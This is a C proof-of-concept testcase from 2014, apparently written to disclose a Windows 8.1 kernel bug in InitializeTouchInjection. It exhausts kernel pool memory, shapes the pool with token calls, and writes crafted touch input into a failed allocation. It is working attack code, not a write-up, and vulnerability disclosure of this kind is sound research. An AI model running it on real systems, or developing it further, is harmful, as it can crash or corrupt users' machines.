#ifndef WIN32_NO_STATUS
# define WIN32_NO_STATUS
#endif
#include <windows.h>
#include <assert.h>
#include <stdio.h>
#include <winerror.h>
#include <winternl.h>
#include <stddef.h>
#include <winnt.h>
#ifdef WIN32_NO_STATUS
# undef WIN32_NO_STATUS
#endif
#include <ntstatus.h>
 
#pragma comment(lib, "ntdll")
#pragma comment(lib, "user32")
#pragma comment(lib, "gdi32")
#pragma comment(lib, "advapi32")
 
// InitializeTouchInjection() Win8.1 Testcase
// -- Tavis Ormandy <taviso@google.com>, Feb 2014.
 
int main(int argc, char **argv)
{
POINTER_TOUCH_INFO Contact;
SID_AND_ATTRIBUTES SidToRestricted;
ULONG Size;
HANDLE Handle;
 
ZeroMemory(&Contact, sizeof Contact);
ZeroMemory(&SidToRestricted, sizeof SidToRestricted);
 
// I *think* TOUCH_MASK_CONTACTAREA is required (i.e. rcContact), the rest
// just need to be valid.
Contact.pointerInfo.pointerType = PT_TOUCH;
Contact.pointerInfo.pointerFlags = POINTER_FLAG_DOWN | POINTER_FLAG_INRANGE | POINTER_FLAG_INCONTACT;
Contact.pointerInfo.ptPixelLocation.x = 'AAAA';
Contact.pointerInfo.ptPixelLocation.y = 'AAAA';
Contact.rcContact.left = 'AAAA';
Contact.rcContact.right = 'AAAA';
Contact.rcContact.top = 'AAAA';
Contact.rcContact.bottom = 'AAAA';
Contact.touchFlags = TOUCH_FLAG_NONE;
Contact.touchMask = TOUCH_MASK_CONTACTAREA;
Size = SECURITY_MAX_SID_SIZE;
Handle = INVALID_HANDLE_VALUE;
SidToRestricted.Sid = _alloca(Size);
 
CreateWellKnownSid(WinNullSid, NULL, SidToRestricted.Sid, &Size);
 
// This just exhausts available pool (how that's accomplished is irrelevant).
for (Size = 1 << 26; Size; Size >>= 1) {
while (CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
;
}
 
for (;;) {
// Initialize touch injection with very small number of contacts.
InitializeTouchInjection(1, TOUCH_FEEDBACK_DEFAULT);
 
// Now increase the number of contacts, which should (eventually) cause an allocation fail.
InitializeTouchInjection(MAX_TOUCH_COUNT, TOUCH_FEEDBACK_DEFAULT);
 
// I think this will just massage the pool, sequence found by fuzzing.
OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &Handle);
CreateRestrictedToken(Handle, 0, 0, NULL, 0, NULL, 1, &SidToRestricted, &Handle);
 
// Write something to the touch injection allocation.
InjectTouchInput(1, &Contact);
}
 
return 0;
}
